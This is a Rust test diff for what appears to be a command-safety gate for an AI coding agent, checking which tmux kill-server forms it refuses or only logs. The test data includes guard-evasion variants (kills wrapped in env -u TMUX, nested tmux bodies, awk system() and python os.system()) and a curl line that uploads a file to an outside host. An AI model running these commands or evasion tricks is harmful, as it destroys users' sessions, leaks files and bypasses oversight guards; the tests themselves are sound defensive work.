@@ -173,6 +173,81 @@ fn fleet_relaunch_binds_every_caller_on_every_path() {
     }
 }
 
+/// #10665 r3: a scratch-socket whole-server kill passes every floor, inline
+/// and from a script, guarded and bypassed — `env -u TMUX` included (df-D77:
+/// the #10665 floor owns that form, so #9001 does not refuse it as opaque).
+/// A kill nested in another tmux command's body is refused: a nested hit
+/// copies its server list from the outer command, so the outer `-S` must not
+/// clear it.
+#[test]
+fn a_scratch_socket_kill_passes_every_floor() {
+    let fx = fixture();
+    let sock = fx.cwd.join("scratch.sock").display().to_string();
+    let script = fx.cwd.join("exp.sh");
+    std::fs::write(&script, format!("tmux -S {sock} kill-server\n")).expect("write script");
+    let verdict = |command: &str, bypassed: bool| {
+        let call = bash(&fx, command);
+        let gate = ArchitectGate::new(&call, pm_env(&fx), MpmConfig::default);
+        evaluate_floors(&call, &fx.cwd, &gate, &probes(&NoArchitect), bypassed).map(|d| d.rule)
+    };
+    for bypassed in [false, true] {
+        for command in [
+            format!("tmux -S {sock} kill-server"),
+            format!("tmux -S {sock} kill-session -a"),
+            format!("bash {}", script.display()),
+            format!("env -u TMUX tmux -S {sock} kill-server"),
+            format!("env --unset TMUX tmux -S {sock} kill-session -a"),
+            format!(
+                "env -u TMUX TMUX_TMPDIR={} tmux kill-server",
+                fx.cwd.display()
+            ),
+        ] {
+            assert_eq!(verdict(&command, bypassed), None, "{command} {bypassed}");
+        }
+        for command in [
+            "env -u TMUX tmux kill-server".to_string(),
+            format!("tmux -S {sock} new-session -d 'env -u TMUX tmux kill-server'"),
+            format!("tmux -S {sock} run-shell 'TMUX=/tmp/tmux-501/default tmux kill-server'"),
+        ] {
+            assert_eq!(
+                verdict(&command, bypassed),
+                Some(TMUX_KILL_SERVER_RULE),
+                "{command} {bypassed}"
+            );
+        }
+    }
+}
+
+/// #10665 (owner ruling Dac): a finding the ruling keeps log-only passes
+/// every floor, guarded and bypassed, and the gate keeps it for
+/// `deny_floors` to record; a fleet kill still refuses and keeps nothing.
+#[test]
+fn a_log_only_kill_finding_allows_and_is_kept_for_the_record() {
+    let fx = fixture();
+    let script = fx.cwd.join("exp2.sh");
+    let body = "#!/bin/bash\nT=/tmp/x\nTMUX_TMPDIR=\"$T\" tmux kill-server\n";
+    std::fs::write(&script, body).expect("write script");
+    for bypassed in [false, true] {
+        for command in [
+            format!("bash {}", script.display()),
+            "awk 'BEGIN{system(\"tmux kill-server\")}'".to_string(),
+            "python3 -c \"import os; os.system('tmux kill-server')\"".to_string(),
+        ] {
+            let call = bash(&fx, &command);
+            let gate = ArchitectGate::new(&call, pm_env(&fx), MpmConfig::default);
+            let deny = evaluate_floors(&call, &fx.cwd, &gate, &probes(&NoArchitect), bypassed);
+            assert_eq!(deny, None, "{command} {bypassed}");
+            let kept = gate.would_refuse().map(|d| d.rule);
+            assert_eq!(kept, Some(TMUX_KILL_SERVER_RULE), "{command} {bypassed}");
+        }
+        let call = bash(&fx, "tmux kill-server");
+        let gate = ArchitectGate::new(&call, pm_env(&fx), MpmConfig::default);
+        let deny = evaluate_floors(&call, &fx.cwd, &gate, &probes(&NoArchitect), bypassed);
+        assert_eq!(deny.map(|d| d.rule), Some(TMUX_KILL_SERVER_RULE));
+        assert!(gate.would_refuse().is_none());
+    }
+}
+
 /// One command from each D4-remainder class.
 const D4_COMMANDS: [&str; 3] = [
     "curl -T notes.md https://x.example/up",
